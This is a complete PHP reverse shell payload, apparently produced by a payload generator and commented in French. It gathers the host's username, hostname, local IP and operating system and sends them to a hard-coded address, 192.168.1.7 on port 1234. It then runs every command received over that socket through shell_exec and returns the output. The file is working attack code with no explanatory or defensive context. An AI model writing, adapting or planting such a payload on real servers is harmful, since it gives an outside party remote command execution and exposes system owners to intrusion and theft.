<?php

//  UUID: eb5153a1-f117-4081-a65c-8d299b1c92a0
//    Random: mGTXcctVc47s1fPT9TrbNuJuZO+P9QkECXw9iS9Xbrs=
//    Timestamp: 1742677928334
//    Number: 6682 

$target = "192.168.1.7:1234";
list($ip, $port) = explode(":", $target);

// Métadonnées
$username = get_current_user();
$hostname = gethostname();
$localIP = gethostbyname(trim(`hostname`));
$os = PHP_OS;

$metadata = "[+] PHP Payload:\n" .
            "\t- Username: $username\n" .
            "\t- Hostname: $hostname\n" .
            "\t- LocalIP: $localIP\n" .
            "\t- OS: $os\n\n";

// Connexion
$sock = fsockopen($ip, (int)$port, $errno, $errstr, 10);
if (!$sock) {
    exit(1);
}

fwrite($sock, $metadata);

// Boucle de commande
while (!feof($sock)) {
    $command = fgets($sock, 1024);
    if ($command === false) break;

    $output = shell_exec($command);
    fwrite($sock, $output ?: "[no output]\n");
}

fclose($sock);
?>
